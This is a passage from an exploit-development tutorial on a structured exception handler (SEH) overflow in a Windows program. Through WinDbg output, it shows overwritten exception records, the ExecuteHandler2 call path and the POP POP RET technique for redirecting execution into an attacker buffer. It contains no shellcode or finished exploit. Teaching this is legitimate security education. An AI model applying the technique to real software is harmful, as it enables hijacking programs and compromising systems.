cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x24:
77316250 ffd1            call    ecx {41414141}
```

Once we have understood how to redirect code execution, we need to make it point to our payload.
During a vanilla stack overflow, the attacker overwrites a return address, and consequently the EIP register, with the address of an instruction (like “jmp esp”) that can redirect the execution flow to the stack, where a payload is stored.
However, in this scenario we **do not control the stack when we gain control of the instruction pointer**. Let's inspect ESP when we change the EIP:
```c
0:010> t
eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000
eip=77316250 esp=0175f444 ebp=0175f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x24:
77316250 ffd1            call    ecx {41414141}
0:010> dds esp L8
0175f444  0175f540
0175f448  0175ff44
0175f44c  0175f55c
0175f450  0175f4cc
0175f454  0175fe0c
0175f458  77316270 ntdll!ExecuteHandler2+0x44
0175f45c  0175ff44
0175f460  0175f528
```

But let's inspect the four argument passed to the `_except_handler` function before calling it:
```cpp
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (
IN PEXCEPTION_RECORD ExceptionRecord, 
IN VOID EstablisherFrame, 
IN OUT PCONTEXT ContextRecord, 
IN OUT PDISPATCHER_CONTEXT DispatcherContext );
```
The argument of interest is the **EstablisherFrame** argument, which is a pointer to the `_EXCEPTION_REGISTRATION_RECORD` structure used to handle the exception. Remember we managed to overwrite the two parameters of this structure!
```c
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0090fe0c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0090ff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x1008df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0090ff44
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
```

So if we managed to overwrite this structure, let's inspect how many bytes we managed to overwrite starting from such structure's address:
```c
0:010> !teb
TEB at 00286000
    ExceptionList:        0175f454
    StackBase:            01760000
    StackLimit:           0175e000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00286000
    EnvironmentPointer:   00000000
    ClientId:             000016cc . 00000f30
    RpcHandle:            00000000
    Tls Storage:          0050a108
    PEB Address:          00279000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
0:010> dt _EXCEPTION_REGISTRATION_RECORD 0175f454
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0175fe0c _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77316270     _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+0
0:010> dt _EXCEPTION_REGISTRATION_RECORD 0x0175fe0c 
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0175ff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0094df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
0:010> dt _EXCEPTION_REGISTRATION_RECORD 0x0175ff44 
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
0:010> dds 0x0175ff44 
0175ff44  41414141
0175ff48  41414141
0175ff4c  41414141
0175ff50  41414141
0175ff54  41414141
0175ff58  41414141
0175ff5c  41414141
0175ff60  41414141
0175ff64  41414141
0175ff68  41414141
0175ff6c  41414141
0175ff70  41414141
0175ff74  41414141
0175ff78  41414141
0175ff7c  41414141
0175ff80  41414141
0175ff84  41414141
0175ff88  41414141
0175ff8c  41414141
0175ff90  41414141
0175ff94  41414141
0175ff98  41414141
0175ff9c  41414141
0175ffa0  41414141
0175ffa4  41414141
0175ffa8  41414141
0175ffac  41414141
0175ffb0  41414141
0175ffb4  41414141
0175ffb8  41414141
0175ffbc  41414141
0175ffc0  41414141
```
As we can see, the pointer to our `_EXCEPTION_REGISTRATION_RECORD` stores an address to where our payload is located! We did not only override those bytes, but more bytes!
So the same buffer that we used to overwrite the `_EXCEPTION_REGISTRATION_RECORD` to modify the EIP is the same that we will use to store our payload.

Let's locate the section where we put the parameters of ExecuteHandler2 to see where our paramter of interest is located:
```c
0:010> u @eip L11
ntdll!ExecuteHandler2:
7731622c 55              push    ebp
7731622d 8bec            mov     ebp,esp
7731622f ff750c          push    dword ptr [ebp+0Ch]
77316232 52              push    edx
77316233 64ff3500000000  push    dword ptr fs:[0]
7731623a 64892500000000  mov     dword ptr fs:[0],esp
77316241 ff7514          push    dword ptr [ebp+14h]
77316244 ff7510          push    dword ptr [ebp+10h]
77316247 ff750c          push    dword ptr [ebp+0Ch] // This is the EstablisherFrame address 
7731624a ff7508          push    dword ptr [ebp+8]
7731624d 8b4d18          mov     ecx,dword ptr [ebp+18h]
77316250 ffd1            call    ecx // This ends calling 0x41414141, our handler function! 
77316252 648b2500000000  mov     esp,dword ptr fs:[0]
77316259 648f0500000000  pop     dword ptr fs:[0]
77316260 8be5            mov     esp,ebp
77316262 5d              pop     ebp
77316263 c21400          ret     14h
```

Indeed, if we inspect that address, we will find that is is the location of our shellcode:
```c
0:010> t
eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000
eip=77316247 esp=0175f44c ebp=0175f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x1b:
77316247 ff750c          push    dword ptr [ebp+0Ch]  ss:0023:0175f46c=0175ff44
```

Let's see the contents of ebp+0ch: 
```c
0:010> dds ebp+0xc
0175f46c  0175ff44
```

We can see that the address of our `_EXCEPTION_REGISTRATION_RECORD` is there. The other parameters are also EBP offsets, but we are not interested.

Once that we know that such address is the one we want to redirect the execution flow, we could overwrite the exception handler with the address of an instruction that returns into the **EstablisherFrame** address on the stack, so that our code is executed.
The most common sequence of instructions used in SEH overflows to accomplish this task is **“POP R32, POP R32, RET”,** in which we POP the return address and the ExceptionRecord argument from the stack into two arbitrary registers (R32) and then execute a RET operation to return into the EstablisherFrame. This is because we pushed the last argument, before the "call ecx" instruction. The call instruction pushes in the stack the return address, so would have to pop the return address and the last argument to have the EstablisherFrame address in the top of the stack, so we can perform a `ret` to this address and redirect the flow.